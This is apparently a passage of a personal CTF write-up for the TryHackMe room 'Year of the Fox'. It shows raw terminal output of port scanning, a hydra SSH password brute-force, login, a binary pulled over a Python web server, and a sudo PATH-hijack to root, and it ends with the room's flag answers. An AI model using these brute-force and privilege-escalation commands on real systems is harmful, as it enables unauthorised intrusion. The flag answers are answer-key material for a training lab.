[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.21:80
Open 10.10.249.21:139
Open 10.10.249.21:445
Open 10.10.249.21:8888

now is open port 22

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.249.21:8888 -t 64     
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-25 20:54:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.249.21:8888/
[8888][ssh] host: 10.10.249.21   login: fox   password: ricardo
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 21 final worker threads did not complete until end.
[ERROR] 21 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-25 20:54:43

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh -p 8888 fox@10.10.249.21                   
The authenticity of host '[10.10.249.21]:8888 ([10.10.249.21]:8888)' can't be established.
ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.249.21]:8888' (ED25519) to the list of known hosts.
fox@10.10.249.21's password: 


	__   __                       __   _   _            _____         
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\


                                                                  
fox@year-of-the-fox:~$ ls
samba  user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
fox@year-of-the-fox:~$ cd samba/
fox@year-of-the-fox:~/samba$ ls
cipher.txt  creds1.txt
fox@year-of-the-fox:~/samba$ cat cipher.txt 
JV5FKMSNPJGTITTKKF5E46SZGJGXUVJSJZKFS6CONJCXUTTKJV4U26SBPJHUITJUJV5EC6SNPJMX
STL2MN5E6RCNGJGXUWJSJZCE2NKONJGTETLKLEZE26SBGIFE4VCZPBBWUTJUJZVEK6SNPJGXOTL2
IV5E6VCNGRHGURL2JVVFSMSNPJTTETTKJUYE26SRPJGWUTJSJZVE2MSNNJMTCTL2KUZE2VCNGBGX
USL2JZVE2M2ONJEXUCSNNJGTGTL2JEZE4ULPPJHVITLXJZVEK6SPIREXOTLKIF4VURCCNBBWOPJ5
BI======
fox@year-of-the-fox:~/samba$ cat creds1.txt 
JV5GO6SNKRGTKTL2M4ZE2VCNPBGXUWL2JZKE26SNPJGXUT2UJV4E26SVPJGXUWJSJV5FC6SNPJMT
ETL2LF5E42SZPJGXURJSJV5E2MCONJKXUTSEJU2U42SZGIFE26SZPBBWUTJSJV5E2MSNKRGXOTL2
KUZE2VCZPJGXUQL2J5CE26KONJITETSELF5E42SRGJGWUTL2JV5FC6SNIRGXQTL2IF5E22SNO5GX
UY32J5KE26KNPJRXUCSPKRMXQTTKKEZE2Z3PPJGUIWJSJV5FC6SNPJEXOTLKIF4VURCCNBBWOPJ5
BI======

fox@year-of-the-fox:~/samba$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown

fox@year-of-the-fox:/usr/bin$ cd /usr/sbin

fox@year-of-the-fox:/usr/sbin$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [26/Mar/2023 02:05:35] "GET /shutdown HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.249.21:8000/shutdown
--2023-03-25 21:05:34--  http://10.10.249.21:8000/shutdown
Connecting to 10.10.249.21:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8304 (8.1K) [application/octet-stream]
Saving to: ‘shutdown’

shutdown              100%[=========================>]   8.11K  --.-KB/s    in 0s      

2023-03-25 21:05:34 (115 MB/s) - ‘shutdown’ saved [8304/8304]

┌──(witty㉿kali)-[~/Downloads]
└─$ file shutdown 
shutdown: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c855d329bb81903275997549d0856f9fcb1d40fd, not stripped

┌──(witty㉿kali)-[~/Downloads]
└─$ strings shutdown      
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
AWAVI
AUATL
[]A\A]A^A_
poweroff
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
shutdown.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment

the binary executes `poweroff` without an absolute path

fox@year-of-the-fox:/usr/sbin$ cd /tmp
fox@year-of-the-fox:/tmp$ cp /bin/bash /tmp/poweroff
fox@year-of-the-fox:/tmp$ sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
root@year-of-the-fox:/tmp# cd /root
root@year-of-the-fox:/root# ls -lah
total 36K
drwx------  5 root root 4.0K Mar 25 22:17 .
drwxr-xr-x 22 root root 4.0K May 29  2020 ..
lrwxrwxrwx  1 root root    9 May 28  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K May 30  2020 .cache
drwx------  3 root root 4.0K May 30  2020 .gnupg
drwxr-xr-x  3 root root 4.0K May 28  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   21 May 31  2020 root.txt
-rw-r--r--  1 root root   75 May 31  2020 .selected_editor
root@year-of-the-fox:/root# cat root.txt 
Not here -- go find!

root@year-of-the-fox:/root# find /home -group root -type f
/home/rascal/.did-you-think-I-was-useless.root
/home/fox/user-flag.txt
/home/fox/samba/cipher.txt
root@year-of-the-fox:/root# cat /home/rascal/.did-you-think-I-was-useless.root
THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}

Here's the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMwo= (from base64)

Good luck!

https://cyberchef.io/#recipe=Reverse('Character')From_Hex('Auto')ROT13(true,true,false,21)&input=YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMwMw

08de5229f8abaa@tryhackme.com

```


![[Pasted image 20230325181741.png]]


What is the **web** flag?  

*THM{Nzg2ZWQwYWUwN2UwOTU3NDY5ZjVmYTYw}*

What is the **user** flag?  

*THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}*

What is the **root** flag?

*THM{ODM3NTdkMDljYmM4ZjdhZWFhY2VjY2Fk}*


[[PS Eclipse]]
